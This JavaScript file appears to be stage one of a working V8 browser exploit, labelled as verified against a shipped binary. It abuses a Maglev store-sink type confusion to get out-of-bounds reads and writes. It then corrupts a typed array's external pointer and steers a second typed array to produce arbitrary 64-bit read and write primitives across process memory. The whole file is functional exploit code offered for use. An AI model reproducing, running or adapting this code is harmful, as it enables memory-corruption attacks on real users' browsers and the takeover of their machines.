/* =====================================================================
 * writeprim.js -- stage 1 write half: maglev-store-sink OOB double write,
 * stitched with smi-check addrof into read64c/write64c via the two-typed-
 * array steer.  Verified end to end on the shipped binary (natural tier-up,
 * bot flags only): two same-shape objects read the SAME map word, and a
 * write flips a JS-visible property.
 *
 *   window.WRITE_PRIM.arm(addrof)  ->  { read64c, write64c }
 *
 * Mechanism:
 *   - store-sink confuses `a = TEMPLATE.slice()` (PACKED_SMI) into being
 *     read/written as a FixedDoubleArray, giving an attacker-indexed 8-byte
 *     OOB read+write past its backing store.
 *   - We groom a fresh Uint8Array `U` right after `a`, so U's JSTypedArray
 *     header lands in the OOB window, and overwrite U.external_pointer (+0x30)
 *     with &U2.external_pointer, where U2 is a persistent Uint8Array whose
 *     address comes from smi-check addrof.
 *   - Thereafter U[0..7] IS U2.external_pointer: writing U steers U2's window
 *     anywhere in the (unsandboxed) process, and U2[j] reads/writes there.
 *
 * addrof(U2) is read only AFTER the warmup, because the warmup allocates
 * heavily and a scavenge moves young objects; U2 is promoted by then.
 * ===================================================================== */
(function () {
  "use strict";
  function log(m) { try { if (window.XLOG) window.XLOG(m); } catch (e) {} }

  var NARM = 400;
  var LEN  = 48;           // even length: TA byte_length lands 8-aligned
  var VSIZE = 0x4142;      // unique view size (distinguishes our TA in the sweep)
  var BUDGET = 2600;

  var f64 = new Float64Array(1), u32 = new Uint32Array(f64.buffer);
  function b2d(v) { u32[0] = Number(v & 0xffffffffn); u32[1] = Number((v >> 32n) & 0xffffffffn); return f64[0]; }
  function d2b(x) { f64[0] = x; return (BigInt(u32[1]) << 32n) | BigInt(u32[0]); }
  function idle(ms) { var t = Date.now(), s = 1; while (Date.now() - t < ms) { s += Math.sqrt(s); } return s; }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function build() {
    var s = "";
    for (var i = 0; i < NARM; i++) s += "if(k===" + i + "){k=-1;}\n";
    s += "a[0]=1.5;\n";                         // TransitionElementsKindOrCheckMap [from]
    s += "b[b.length]=o;\n";                    // StoreFixedArrayElementWithWriteBarrier [to]
    s += "var r=a[ri];\n";                      // confused OOB read
    s += "a[wi]=wv;\n";                         // confused OOB write
    s += "for(var i=0;i<n;i++){ for(var j=0;j<2;j++){ } }\n";
    s += "return r;\n";
    return new Function("a", "b", "o", "k", "n", "ri", "wi", "wv", s);
  }

  window.WRITE_PRIM = {
    arm: async function (addrof) {
      if (typeof addrof !== "function") throw new Error("writeprim needs addrof");
      var CAGE = BigInt(cageBase());
      var f = build();
      var OBJ = { q: 1 };
      var TPL = []; for (var i = 0; i < LEN; i++) TPL.push(i + 1);
      var U2 = new Uint8Array(VSIZE);
      var VSZ = BigInt(VSIZE);

      var calls = 0, fired = -1;
      function shot(ri, wi, wv) {
        var a = TPL.slice(); var U = new Uint8Array(VSIZE); var b = [{}, {}, {}];
        var r = f(a, b, OBJ, -5, 1, ri, wi, wv); calls++;
        return { r: r, U: U, blen: b.length };
      }

      // arm: warm until the confusion fires (sunk store makes b not length 4)
      for (i = 0; i < 700 && fired < 0; i++) { var s0 = shot(1, 1, 9.5); if (s0.blen !== 4) fired = calls; }
      for (var rd = 0; rd < 5 && fired < 0; rd++) { idle(2000); for (i = 0; i < 300 && fired < 0; i++) { var s1 = shot(1, 1, 9.5); if (s1.blen !== 4) fired = calls; } }
      if (fired < 0) throw new Error("store-sink did not fire in " + calls + " calls");
      log("store-sink fired at call " + fired);

      // locate U's external_pointer slot: byte_length(VSIZE) at slot i,
      // external at i+2 (0x30-0x20=0x10=2 slots), base_pointer(0 low) at i+3.
      function windowVals() { var v = []; for (var ri = 0; ri < LEN; ri++) { var x = shot(ri, 1, 9.5).r; v.push(typeof x === "number" ? d2b(x) : -1n); } return v; }
      function findExt() {
        var v = windowVals();
        for (var i = 0; i + 3 < v.length; i++)
          if (v[i] === VSZ && v[i + 2] > 0x10000n && v[i + 2] < 0x800000000000n && (v[i + 3] & 0xffffffffn) === 0n)
            return i + 2;
        return -1;
      }
      var extIdx = -1;
      for (var t = 0; t < 6 && extIdx < 0; t++) extIdx = findExt();
      if (extIdx < 0) throw new Error("could not locate TypedArray external_pointer slot");
      log("external_pointer slot = " + extIdx);

      // corrupt U.external := &U2.external_pointer, verify, retry
      var U = null, read64c = null, write64c = null;
      for (var attempt = 0; attempt < 12 && !U; attempt++) {
        var u2ExtField = CAGE + BigInt(addrof(U2)) + 0x30n;
        var Ux = shot(1, extIdx, b2d(u2ExtField)).U;
        var pv = 0n; for (var k = 7; k >= 0; k--) pv = (pv << 8n) | BigInt(Ux[k]);
        if (!(pv > 0x10000n && pv < 0x800000000000n)) continue;
        (function (view) {
          var setWin = function (A) { for (var k = 0; k < 8; k++) { view[k] = Number(A & 0xffn); A >>= 8n; } };
          var r64 = function (c) { var A = CAGE + BigInt(c >>> 0); setWin(A); var v = 0n; for (var k = 7; k >= 0; k--) v = (v << 8n) | BigInt(U2[k]); return v; };
          var t1 = Number(r64(addrof({ z: 1 })) & 0xffffffffn) >>> 0;
          var t2 = Number(r64(addrof({ z: 2 })) & 0xffffffffn) >>> 0;
          if (t1 !== 0 && t1 === t2) {
            U = view; read64c = r64;
            write64c = function (c, val) { var A = CAGE + BigInt(c >>> 0); setWin(A); for (var k = 0; k < 8; k++) { U2[k] = Number(val & 0xffn); val >>= 8n; } };
          }
        })(Ux);
      }
      if (!U) throw new Error("could not establish read/write via steer");
      log("read/write established after " + calls + " calls");
      return { read64c: read64c, write64c: write64c };
    }
  };
})();
